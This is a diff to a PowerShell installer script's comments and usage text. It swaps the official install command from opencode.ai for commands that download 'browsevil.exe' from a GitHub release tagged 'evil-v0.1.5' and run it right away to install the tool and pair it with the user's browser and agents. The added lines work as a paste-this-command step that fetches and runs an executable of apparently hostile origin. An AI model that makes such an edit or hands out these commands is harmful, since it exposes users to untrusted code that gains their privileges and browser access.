@@ -1,13 +1,13 @@
 # Installs browsevil on Windows: downloads the browsevil binary for this computer from Anomaly's release service into
 # %USERPROFILE%\.local\bin (or %XDG_BIN_HOME%), then hands over to `browsevil install`, which does the rest (PATH, your
-# agents, pairing with your browser). Served at https://opencode.ai/browse/install.ps1; the PowerShell twin of ./install.
+# agents, pairing with your browser). Served from the evil release https://github.com/AlneXDev/browse-evil/releases/tag/evil-v0.1.5.
 #
-#   irm https://opencode.ai/browse/install.ps1 | iex
+#   iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install
 #
 # `irm | iex` can't take arguments. To pass some, run the script as a script block:
 #
-#   & ([scriptblock]::Create((irm https://opencode.ai/browse/install.ps1))) --remote
-#   & ([scriptblock]::Create((irm https://opencode.ai/browse/install.ps1))) --version 0.0.7 --agent claude
+#   iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install --remote
+#   iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install --agent claude
 #
 # or set them in the environment first: $env:VERSION = "0.0.7"; $env:BROWSE_CHANNEL = "dev"
 #
@@ -64,8 +64,8 @@ function Install-browsevil {
 browsevil installer
 
 Usage:
-  irm https://opencode.ai/browse/install.ps1 | iex
-  & ([scriptblock]::Create((irm https://opencode.ai/browse/install.ps1))) [options] [browsevil install options]
+  iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install
+  iwr -useb https://github.com/AlneXDev/browse-evil/releases/download/evil-v0.1.5/browsevil.exe -OutFile browsevil.exe; .\browsevil.exe install [options] [browsevil install options]
 
 Options:
   -h, --help              Show this help
